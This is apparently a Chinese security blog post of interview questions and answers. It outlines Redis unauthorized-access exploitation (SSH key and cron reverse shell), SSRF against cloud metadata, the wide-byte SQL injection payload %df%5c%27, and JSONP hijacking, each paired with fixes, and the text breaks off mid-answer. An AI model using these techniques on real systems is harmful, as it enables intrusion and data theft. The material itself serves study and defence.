<span class="toc-text">如何绕过 WAF、HIDS、威胁感知？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%9C%A8%E7%A6%81%E6%AD%A2%E5%87%BA%E7%BD%91%E7%9A%84%E6%9C%BA%E5%99%A8%E4%B8%8A%E8%AE%BF%E9%97%AE%E4%BA%92%E8%81%94%E7%BD%91%EF%BC%9F"><span class="toc-number">85.7.</span> <span class="toc-text">如何在禁止出网的机器上访问互联网？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ew%E3%80%81frp-%E5%B7%AE%E5%BC%82%EF%BC%9F"><span class="toc-number">85.8.</span> <span class="toc-text">ew、frp 差异？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ICMP-%E5%A6%82%E4%BD%95%E5%87%BA%E7%BD%91%EF%BC%9F"><span class="toc-number">85.9.</span> <span class="toc-text">ICMP 如何出网？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8-XSS-%E8%AE%A9%E5%BD%B1%E5%93%8D%E6%9C%80%E5%A4%A7%E5%8C%96%EF%BC%9F"><span class="toc-number">85.10.</span> <span class="toc-text">如何利用 XSS 让影响最大化？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%85%A8%E6%B5%81%E7%A8%8B%E6%9C%80%E5%A4%A7%E9%99%90%E5%BA%A6%E9%99%8D%E4%BD%8E%E8%A2%AB%E7%BA%A2%E5%86%9B%E5%8F%91%E7%8E%B0%E6%A6%82%E7%8E%87%EF%BC%9F"><span class="toc-number">85.11.</span> <span class="toc-text">如何全流程最大限度降低被红军发现概率？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E5%B2%97%E4%BD%8D"><span class="toc-number">86.</span> <span class="toc-text">安全开发岗位</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#equals-%E4%B8%8E-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">86.1.</span> <span class="toc-text">equals 与 &#x3D;&#x3D; 的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8C%BA%E5%9F%9F%E5%A6%82%E4%BD%95%E5%88%92%E5%88%86%EF%BC%9F"><span class="toc-number">86.2.</span> <span class="toc-text">Java 虚拟机区域如何划分？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E9%87%8D%E8%BD%BD%E4%B8%8E%E6%96%B9%E6%B3%95%E9%87%8D%E5%86%99%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">86.3.</span> <span class="toc-text">方法重载与方法重写的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HashMap%E3%80%81HashTable%E3%80%81ConcurrentHashMap-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">86.4.</span> <span class="toc-text">HashMap、HashTable、ConcurrentHashMap 的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B%E5%8C%BA%E5%88%AB%EF%BC%8C%E7%BA%BF%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%E6%9C%89%E5%93%AA%E4%BA%9B%E6%96%B9%E5%BC%8F%EF%BC%9F"><span class="toc-number">86.5.</span> <span class="toc-text">进程和线程区别，线程间通信有哪些方式？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-BIO-NIO-AIO-%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E9%80%82%E7%94%A8%E5%93%AA%E4%BA%9B%E5%9C%BA%E6%99%AF%EF%BC%9F"><span class="toc-number">86.6.</span> <span class="toc-text">Java BIO&#x2F;NIO&#x2F;AIO 是什么？适用哪些场景？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%91%E4%B8%80%E4%B8%AA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88%E5%B7%A5%E5%8E%82%E3%80%81%E5%8D%95%E4%BE%8B%E3%80%81%E9%80%82%E9%85%8D%E5%99%A8%E3%80%81%E8%A7%82%E5%AF%9F%E8%80%85%EF%BC%89%E8%BF%9B%E8%A1%8C%E8%AE%B2%E8%A7%A3"><span class="toc-number">86.7.</span> <span class="toc-text">挑一个设计模式（工厂、单例、适配器、观察者）进行讲解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F"><span class="toc-number">86.7.1.</span> <span class="toc-text">单例模式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#synchronized-%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%EF%BC%9FObject-%E7%9A%84-wait%E3%80%81notify-%E6%96%B9%E6%B3%95%E6%9C%89%E4%BB%80%E4%B9%88%E4%BD%9C%E7%94%A8%EF%BC%9F"><span class="toc-number">86.8.</span> <span class="toc-text">synchronized 如何使用？Object 的 wait、notify 方法有什么作用？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sleep-%E5%92%8C-wait-%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F"><span class="toc-number">86.9.</span> <span class="toc-text">sleep() 和 wait() 有什么区别？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%B9%82%E7%AD%89%E6%80%A7%EF%BC%9F%E4%B8%80%E8%88%AC%E6%9C%89%E4%BB%80%E4%B9%88%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%EF%BC%9F"><span class="toc-number">86.10.</span> <span class="toc-text">什么是幂等性？一般有什么方式实现？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E6%96%87%E4%BB%B6%E5%B0%8F%E5%86%85%E5%AD%98%E7%9A%84%E6%8E%92%E5%BA%8F%E5%A6%82%E4%BD%95%E5%81%9A%EF%BC%9F"><span class="toc-number">86.11.</span> <span class="toc-text">大文件小内存的排序如何做？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89-1-%E4%BA%BF%E4%B8%AA%E6%95%B0%E5%AD%97%EF%BC%8C%E5%85%B6%E4%B8%AD%E6%9C%89%E4%B8%A4%E4%B8%AA%E6%98%AF%E9%87%8D%E5%A4%8D%E7%9A%84%EF%BC%8C%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E6%89%BE%E5%88%B0%EF%BC%9F%E8%A6%81%E6%B1%82%E6%97%B6%E9%97%B4%E5%92%8C%E7%A9%BA%E9%97%B4%E6%9C%80%E4%BC%98%E3%80%82"><span class="toc-number">86.12.</span> <span class="toc-text">有 1 亿个数字，其中有两个是重复的，如何快速找到？要求时间和空间最优。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BA%BF%E4%B8%AA%E9%9A%8F%E6%9C%BA%E7%94%9F%E6%88%90%E7%9A%84%E6%97%A0%E5%BA%8F%E6%95%B4%E6%95%B0%EF%BC%8C%E6%89%BE%E5%87%BA%E4%B8%AD%E9%97%B4%E5%A4%A7%E5%B0%8F%E7%9A%84%E5%80%BC%E3%80%82"><span class="toc-number">86.13.</span> <span class="toc-text">1 亿个随机生成的无序整数，找出中间大小的值。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%BC%82%E5%B8%B8%E6%8E%92%E6%9F%A5%E6%B5%81%E7%A8%8B%EF%BC%9F"><span class="toc-number">86.14.</span> <span class="toc-text">调试工具及异常排查流程？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B4%A2%E5%BC%95%E7%BB%93%E6%9E%84%EF%BC%8C%E4%BB%80%E4%B9%88%E6%83%85%E5%86%B5%E4%B8%8B%E5%BA%94%E8%AF%A5%E5%BB%BA%E5%94%AF%E4%B8%80%E7%B4%A2%E5%BC%95%EF%BC%9F"><span class="toc-number">86.15.</span> <span class="toc-text">数据库索引结构，什么情况下应该建唯一索引？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%86%E9%A1%B5%E8%AF%AD%E5%8F%A5%E5%A6%82%E4%BD%95%E5%86%99%EF%BC%9F"><span class="toc-number">86.16.</span> <span class="toc-text">数据库分页语句如何写？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL-%E5%88%86%E9%A1%B5%E6%9F%A5%E8%AF%A2%EF%BC%9A%E4%BC%98%E5%8C%96%E6%96%B9%E5%BC%8F%EF%BC%9A1-%E4%BD%BF%E7%94%A8%E8%A6%86%E7%9B%96%E7%B4%A2%E5%BC%95%EF%BC%9A-2-%E9%81%BF%E5%85%8D-OFFSET-%E6%89%AB%E6%8F%8F%EF%BC%88%E9%80%82%E7%94%A8%E4%BA%8E%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%87%8F%EF%BC%89%EF%BC%9A"><span class="toc-number">87.</span> <span class="toc-text">MySQL 分页查询：1SELECT * FROM users ORDER BY id LIMIT 10 OFFSET 20;优化方式：1. 使用覆盖索引：   1SELECT id, name FROM users WHERE status&#x3D;1 ORDER BY id LIMIT 10 OFFSET 20;2. 避免 OFFSET 扫描（适用于大数据量）：   1SELECT * FROM users WHERE id &gt; 1000 ORDER BY id LIMIT 10;</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTPS-%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B"><span class="toc-number">87.1.</span> <span class="toc-text">HTTPS 交互过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OAuth2-0-%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B%E5%8F%8A%E4%B8%8D%E5%BD%93%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9"><span class="toc-number">87.2.</span> <span class="toc-text">OAuth2.0 交互过程及不当安全风险</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96-URL-%E5%86%85%E5%AE%B9%E6%97%B6%E7%9A%84%E5%AE%89%E5%85%A8%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">87.3.</span> <span class="toc-text">获取 URL 内容时的安全注意事项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E5%85%A5%E5%BA%93%E5%89%8D%E5%A6%82%E4%BD%95%E8%BF%87%E6%BB%A4%EF%BC%9F"><span class="toc-number">87.4.</span> <span class="toc-text">参数入库前如何过滤？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8%E5%92%8C%E6%8B%A6%E6%88%AA%E5%99%A8%E5%8E%9F%E7%90%86%E5%92%8C%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%9F"><span class="toc-number">87.5.</span> <span class="toc-text">过滤器和拦截器原理和应用场景？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SESSION-%E5%92%8C-Cookie-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">87.6.</span> <span class="toc-text">SESSION 和 Cookie 的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SESSION-ID-%E5%A6%82%E4%BD%95%E4%B8%8D%E8%A2%AB-JavaScript-%E8%AF%BB%E5%8F%96%EF%BC%9F"><span class="toc-number">87.7.</span> <span class="toc-text">SESSION ID 如何不被 JavaScript 读取？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-Token-%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%EF%BC%9F"><span class="toc-number">87.8.</span> <span class="toc-text">CSRF Token 如何设计？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%EF%BC%9F%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%AE%89%E5%85%A8%E7%9A%84%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82%EF%BC%9F"><span class="toc-number">87.9.</span> <span class="toc-text">同源策略？如何实现安全的跨域请求？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E6%96%B9%E5%90%91"><span class="toc-number">88.</span> <span class="toc-text">安全架构方向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%A0%E7%BB%9F-IDC%E3%80%81%E4%BA%91%E4%B8%8A%E3%80%81%E6%B7%B7%E5%90%88%E4%BA%91%E6%9E%B6%E6%9E%84%E7%9A%84%E5%AE%89%E5%85%A8%E5%B7%AE%E5%BC%82%E5%92%8C%E6%8C%91%E6%88%98"><span class="toc-number">88.1.</span> <span class="toc-text">传统 IDC、云上、混合云架构的安全差异和挑战</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%91%E5%8E%9F%E7%94%9F%E6%8A%80%E6%9C%AF%E4%B8%8B%E7%9A%84%E5%AE%89%E5%85%A8%E5%8F%98%E5%8C%96"><span class="toc-number">88.2.</span> <span class="toc-text">云原生技术下的安全变化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%AF%E4%BA%91%E4%B8%9A%E5%8A%A1%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%EF%BC%9F"><span class="toc-number">88.3.</span> <span class="toc-text">纯云业务如何设计安全架构？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SDL-%E4%B8%AD%E7%9A%84%E5%85%B3%E9%94%AE%E7%82%B9%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%EF%BC%9F"><span class="toc-number">88.4.</span> <span class="toc-text">SDL 中的关键点以及如何解决？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%9C%A8%E7%94%B2%E6%96%B9%E5%92%8C%E4%B9%99%E6%96%B9%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%9F"><span class="toc-number">88.5.</span> <span class="toc-text">漏洞发现在甲方和乙方的区别？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2-0day-%E6%94%BB%E5%87%BB%EF%BC%9F"><span class="toc-number">88.6.</span> <span class="toc-text">如何防止 0day 攻击？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E4%BC%81%E4%B8%9A%E4%B8%8D%E5%90%8C%E9%98%B6%E6%AE%B5%E3%80%81%E4%B8%8D%E5%90%8C%E4%BD%93%E9%87%8F%E7%9A%84%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E6%96%B9%E6%B3%95%E3%80%81%E5%8C%BA%E5%88%AB%E5%8F%8A%E4%BE%A7%E9%87%8D"><span class="toc-number">88.7.</span> <span class="toc-text">不同企业不同阶段、不同体量的安全建设方法、区别及侧重</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        【工作】面试题整理 应用安全等
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">g0dam</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-03-03T12:15:58.000Z" class="dt-published" itemprop="datePublished">2024-03-03</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="应用安全岗位"><a href="#应用安全岗位" class="headerlink" title="应用安全岗位"></a>应用安全岗位</h2><hr>
<h3 id="Redis-未授权访问漏洞如何入侵利用？"><a href="#Redis-未授权访问漏洞如何入侵利用？" class="headerlink" title="Redis 未授权访问漏洞如何入侵利用？"></a>Redis 未授权访问漏洞如何入侵利用？</h3><h2 id="漏洞原理：Redis-默认监听在-6379-端口，若未设置密码或绑定特定-IP，攻击者可直接访问。利用方式：-写入-SSH-公钥：利用-CONFIG-SET-命令修改配置，设置持久化目录为-root-ssh-，文件名为-authorized-keys，然后使用-SET-命令写入公钥，最终通过-SSH-登录目标服务器。-反弹-Shell：通过-CONFIG-SET-命令修改持久化目录为-var-spool-cron-，文件名为-root，内容为反向-shell-命令，保存后触发定时任务执行，获取远程-shell。修复方案：-设置密码：在-redis-conf-中配置-requirepass-，启用密码认证。-绑定-IP：在-redis-conf-中配置-bind-127-0-0-1，限制仅本地访问。-防火墙限制：使用防火墙规则限制对-6379-端口的访问，仅允许可信-IP。-禁用危险命令：在-redis-conf-中使用-rename-command-禁用或重命名高危命令，如-CONFIG、FLUSHDB-等。"><a href="#漏洞原理：Redis-默认监听在-6379-端口，若未设置密码或绑定特定-IP，攻击者可直接访问。利用方式：-写入-SSH-公钥：利用-CONFIG-SET-命令修改配置，设置持久化目录为-root-ssh-，文件名为-authorized-keys，然后使用-SET-命令写入公钥，最终通过-SSH-登录目标服务器。-反弹-Shell：通过-CONFIG-SET-命令修改持久化目录为-var-spool-cron-，文件名为-root，内容为反向-shell-命令，保存后触发定时任务执行，获取远程-shell。修复方案：-设置密码：在-redis-conf-中配置-requirepass-，启用密码认证。-绑定-IP：在-redis-conf-中配置-bind-127-0-0-1，限制仅本地访问。-防火墙限制：使用防火墙规则限制对-6379-端口的访问，仅允许可信-IP。-禁用危险命令：在-redis-conf-中使用-rename-command-禁用或重命名高危命令，如-CONFIG、FLUSHDB-等。" class="headerlink" title="漏洞原理：Redis 默认监听在 6379 端口，若未设置密码或绑定特定 IP，攻击者可直接访问。利用方式：- 写入 SSH 公钥：利用 CONFIG SET 命令修改配置，设置持久化目录为 /root/.ssh/，文件名为 authorized_keys，然后使用 SET 命令写入公钥，最终通过 SSH 登录目标服务器。- 反弹 Shell：通过 CONFIG SET 命令修改持久化目录为 /var/spool/cron/，文件名为 root，内容为反向 shell 命令，保存后触发定时任务执行，获取远程 shell。修复方案：- 设置密码：在 redis.conf 中配置 requirepass &lt;password&gt;，启用密码认证。- 绑定 IP：在 redis.conf 中配置 bind 127.0.0.1，限制仅本地访问。- 防火墙限制：使用防火墙规则限制对 6379 端口的访问，仅允许可信 IP。- 禁用危险命令：在 redis.conf 中使用 rename-command 禁用或重命名高危命令，如 CONFIG、FLUSHDB 等。"></a><strong>漏洞原理</strong>：Redis 默认监听在 6379 端口，若未设置密码或绑定特定 IP，攻击者可直接访问。<br><strong>利用方式</strong>：<br>- <strong>写入 SSH 公钥</strong>：利用 <code>CONFIG SET</code> 命令修改配置，设置持久化目录为 <code>/root/.ssh/</code>，文件名为 <code>authorized_keys</code>，然后使用 <code>SET</code> 命令写入公钥，最终通过 SSH 登录目标服务器。<br>- <strong>反弹 Shell</strong>：通过 <code>CONFIG SET</code> 命令修改持久化目录为 <code>/var/spool/cron/</code>，文件名为 <code>root</code>，内容为反向 shell 命令，保存后触发定时任务执行，获取远程 shell。<br><strong>修复方案</strong>：<br>- <strong>设置密码</strong>：在 <code>redis.conf</code> 中配置 <code>requirepass &lt;password&gt;</code>，启用密码认证。<br>- <strong>绑定 IP</strong>：在 <code>redis.conf</code> 中配置 <code>bind 127.0.0.1</code>，限制仅本地访问。<br>- <strong>防火墙限制</strong>：使用防火墙规则限制对 6379 端口的访问，仅允许可信 IP。<br>- <strong>禁用危险命令</strong>：在 <code>redis.conf</code> 中使用 <code>rename-command</code> 禁用或重命名高危命令，如 <code>CONFIG</code>、<code>FLUSHDB</code> 等。</h2><h3 id="SSRF-漏洞原理、利用方式及修复方案？Java-和-PHP-的-SSRF-区别？"><a href="#SSRF-漏洞原理、利用方式及修复方案？Java-和-PHP-的-SSRF-区别？" class="headerlink" title="SSRF 漏洞原理、利用方式及修复方案？Java 和 PHP 的 SSRF 区别？"></a>SSRF 漏洞原理、利用方式及修复方案？Java 和 PHP 的 SSRF 区别？</h3><h2 id="漏洞原理：SSRF（Server-Side-Request-Forgery）漏洞允许攻击者构造请求，由服务器发起，访问内部或外部服务。利用方式：-访问内网服务：通过构造请求访问内部服务，如-http-127-0-0-1-5000-admin，获取敏感信息。-探测元数据服务：访问云服务的元数据接口，如-AWS-的-http-169-254-169-254-latest-meta-data-，获取实例信息。-反弹-Shell：利用支持的协议（如-gopher）构造请求，反向连接攻击者主机，获取远程-shell。Java-和-PHP-的-SSRF-区别：-Java：HttpURLConnection、Apache-HttpClient-等类默认支持多种协议，可能被用于-SSRF-攻击。Java通常使用如HttpClient等库发起请求，需要特别注意库的配置以避免SSRF漏洞。-PHP：file-get-contents、cURL-等函数可用于发起请求，需注意协议限制。修复方案：-协议白名单：限制请求协议，仅允许-HTTP-和-HTTPS。-输入验证：严格验证用户输入的-URL，防止非法请求。-防火墙限制：使用防火墙规则限制对内部服务的访问。-云元数据防护：在云环境中，使用防火墙规则限制对元数据服务的访问。"><a href="#漏洞原理：SSRF（Server-Side-Request-Forgery）漏洞允许攻击者构造请求，由服务器发起，访问内部或外部服务。利用方式：-访问内网服务：通过构造请求访问内部服务，如-http-127-0-0-1-5000-admin，获取敏感信息。-探测元数据服务：访问云服务的元数据接口，如-AWS-的-http-169-254-169-254-latest-meta-data-，获取实例信息。-反弹-Shell：利用支持的协议（如-gopher）构造请求，反向连接攻击者主机，获取远程-shell。Java-和-PHP-的-SSRF-区别：-Java：HttpURLConnection、Apache-HttpClient-等类默认支持多种协议，可能被用于-SSRF-攻击。Java通常使用如HttpClient等库发起请求，需要特别注意库的配置以避免SSRF漏洞。-PHP：file-get-contents、cURL-等函数可用于发起请求，需注意协议限制。修复方案：-协议白名单：限制请求协议，仅允许-HTTP-和-HTTPS。-输入验证：严格验证用户输入的-URL，防止非法请求。-防火墙限制：使用防火墙规则限制对内部服务的访问。-云元数据防护：在云环境中，使用防火墙规则限制对元数据服务的访问。" class="headerlink" title="漏洞原理：SSRF（Server-Side Request Forgery）漏洞允许攻击者构造请求，由服务器发起，访问内部或外部服务。利用方式：- 访问内网服务：通过构造请求访问内部服务，如 http://127.0.0.1:5000/admin，获取敏感信息。- 探测元数据服务：访问云服务的元数据接口，如 AWS 的 http://169.254.169.254/latest/meta-data/，获取实例信息。- 反弹 Shell：利用支持的协议（如 gopher）构造请求，反向连接攻击者主机，获取远程 shell。Java 和 PHP 的 SSRF 区别：- Java：HttpURLConnection、Apache HttpClient 等类默认支持多种协议，可能被用于 SSRF 攻击。Java通常使用如HttpClient等库发起请求，需要特别注意库的配置以避免SSRF漏洞。- PHP：file_get_contents、cURL 等函数可用于发起请求，需注意协议限制。修复方案：- 协议白名单：限制请求协议，仅允许 HTTP 和 HTTPS。- 输入验证：严格验证用户输入的 URL，防止非法请求。- 防火墙限制：使用防火墙规则限制对内部服务的访问。- 云元数据防护：在云环境中，使用防火墙规则限制对元数据服务的访问。"></a><strong>漏洞原理</strong>：SSRF（Server-Side Request Forgery）漏洞允许攻击者构造请求，由服务器发起，访问内部或外部服务。<br><strong>利用方式</strong>：<br>- <strong>访问内网服务</strong>：通过构造请求访问内部服务，如 <code>http://127.0.0.1:5000/admin</code>，获取敏感信息。<br>- <strong>探测元数据服务</strong>：访问云服务的元数据接口，如 AWS 的 <code>http://169.254.169.254/latest/meta-data/</code>，获取实例信息。<br>- <strong>反弹 Shell</strong>：利用支持的协议（如 <code>gopher</code>）构造请求，反向连接攻击者主机，获取远程 shell。<br><strong>Java 和 PHP 的 SSRF 区别</strong>：<br>- <strong>Java</strong>：<code>HttpURLConnection</code>、<code>Apache HttpClient</code> 等类默认支持多种协议，可能被用于 SSRF 攻击。Java通常使用如HttpClient等库发起请求，需要特别注意库的配置以避免SSRF漏洞。<br>- <strong>PHP</strong>：<code>file_get_contents</code>、<code>cURL</code> 等函数可用于发起请求，需注意协议限制。<br><strong>修复方案</strong>：<br>- <strong>协议白名单</strong>：限制请求协议，仅允许 HTTP 和 HTTPS。<br>- <strong>输入验证</strong>：严格验证用户输入的 URL，防止非法请求。<br>- <strong>防火墙限制</strong>：使用防火墙规则限制对内部服务的访问。<br>- <strong>云元数据防护</strong>：在云环境中，使用防火墙规则限制对元数据服务的访问。</h2><h3 id="宽字节注入漏洞原理、利用方式及修复方案？"><a href="#宽字节注入漏洞原理、利用方式及修复方案？" class="headerlink" title="宽字节注入漏洞原理、利用方式及修复方案？"></a>宽字节注入漏洞原理、利用方式及修复方案？</h3><h2 id="漏洞原理：宽字节注入利用多字节编码（如-GBK）特性，绕过单字节字符集的过滤，导致-SQL-注入。利用方式：-绕过过滤：在-GBK-编码下，-df-5c-27-被解析为-，绕过过滤器，导致-SQL-注入。修复方案：-统一编码：使用-UTF-8-编码，避免宽字节注入。-参数化查询：使用预编译语句，避免直接拼接-SQL。-输入验证：严格验证用户输入，防止恶意字符。"><a href="#漏洞原理：宽字节注入利用多字节编码（如-GBK）特性，绕过单字节字符集的过滤，导致-SQL-注入。利用方式：-绕过过滤：在-GBK-编码下，-df-5c-27-被解析为-，绕过过滤器，导致-SQL-注入。修复方案：-统一编码：使用-UTF-8-编码，避免宽字节注入。-参数化查询：使用预编译语句，避免直接拼接-SQL。-输入验证：严格验证用户输入，防止恶意字符。" class="headerlink" title="漏洞原理：宽字节注入利用多字节编码（如 GBK）特性，绕过单字节字符集的过滤，导致 SQL 注入。利用方式：- 绕过过滤：在 GBK 编码下，%df%5c%27 被解析为 &#39;，绕过过滤器，导致 SQL 注入。修复方案：- 统一编码：使用 UTF-8 编码，避免宽字节注入。- 参数化查询：使用预编译语句，避免直接拼接 SQL。- 输入验证：严格验证用户输入，防止恶意字符。"></a><strong>漏洞原理</strong>：宽字节注入利用多字节编码（如 GBK）特性，绕过单字节字符集的过滤，导致 SQL 注入。<br><strong>利用方式</strong>：<br>- <strong>绕过过滤</strong>：在 GBK 编码下，<code>%df%5c%27</code> 被解析为 <code>&#39;</code>，绕过过滤器，导致 SQL 注入。<br><strong>修复方案</strong>：<br>- <strong>统一编码</strong>：使用 UTF-8 编码，避免宽字节注入。<br>- <strong>参数化查询</strong>：使用预编译语句，避免直接拼接 SQL。<br>- <strong>输入验证</strong>：严格验证用户输入，防止恶意字符。</h2><h3 id="JSONP-的业务意义、JSONP-劫持利用方式及修复方案？如何设计-CSRF-Token？"><a href="#JSONP-的业务意义、JSONP-劫持利用方式及修复方案？如何设计-CSRF-Token？" class="headerlink" title="JSONP 的业务意义、JSONP 劫持利用方式及修复方案？如何设计 CSRF Token？"></a>JSONP 的业务意义、JSONP 劫持利用方式及修复方案？如何设计 CSRF Token？</h3><h2 id="JSONP-的业务意义：JSONP（JSON-with-Padding）是一种跨域请求数据的技术，利用-标签的跨域特性，允许网页从其他域获取数据。JSONP-劫持利用方式：-劫持敏感数据：攻击者构造恶意页面，利用-JSONP-获取用户敏感信息，如账户余额、个人资料等。修复方案：-禁用-JSONP：不使用-JSONP，改用-CORS-等安全的跨域请求方式。-验证回调函数：严格验证回调函数名，防止被篡改。-使用-HTTPS：通过-HTTPS-加密传输，防止中间人攻击。如何设计-CSRF-Token：-生成-Token：在服务器端生成随机的-CSRF-Token，并与用户会话关联。-嵌入-Token：在每个表单中嵌入该-Token，作为隐藏字段。-验证-Token：在服务器端验证请求中的-Token-是否与会话中的一致。-示例代码：-生成-Token（PHP）：-嵌入-Token（HTML）："><a href="#JSONP-的业务意义：JSONP（JSON-with-Padding）是一种跨域请求数据的技术，利用-标签的跨域特性，允许网页从其他域获取数据。JSONP-劫持利用方式：-劫持敏感数据：攻击者构造恶意页面，利用-JSONP-获取用户敏感信息，如账户余额、个人资料等。修复方案：-禁用-JSONP：不使用-JSONP，改用-CORS-等安全的跨域请求方式。-验证回调函数：严格验证回调函数名，防止被篡改。-使用-HTTPS：通过-HTTPS-加密传输，防止中间人攻击。如何设计-CSRF-Token：-生成-Token：在服务器端生成随机的-CSRF-Token，并与用户会话关联。-嵌入-Token：在每个表单中嵌入该-Token，作为隐藏字段。-验证-Token：在服务器端验证请求中的-Token-是否与会话中的一致。-示例代码：-生成-Token（PHP）：-嵌入-Token（HTML）：" class="headerlink" title="JSONP 的业务意义：JSONP（JSON with Padding）是一种跨域请求数据的技术，利用 &lt;script&gt; 标签的跨域特性，允许网页从其他域获取数据。JSONP 劫持利用方式：- 劫持敏感数据：攻击者构造恶意页面，利用 JSONP 获取用户敏感信息，如账户余额、个人资料等。修复方案：- 禁用 JSONP：不使用 JSONP，改用 CORS 等安全的跨域请求方式。- 验证回调函数：严格验证回调函数名，防止被篡改。- 使用 HTTPS：通过 HTTPS 加密传输，防止中间人攻击。如何设计 CSRF Token：- 生成 Token：在服务器端生成随机的 CSRF Token，并与用户会话关联。- 嵌入 Token：在每个表单中嵌入该 Token，作为隐藏字段。- 验证 Token：在服务器端验证请求中的 Token 是否与会话中的一致。- 示例代码：  - 生成 Token（PHP）：      - 嵌入 Token（HTML）：    "></a><strong>JSONP 的业务意义</strong>：JSONP（JSON with Padding）是一种跨域请求数据的技术，利用 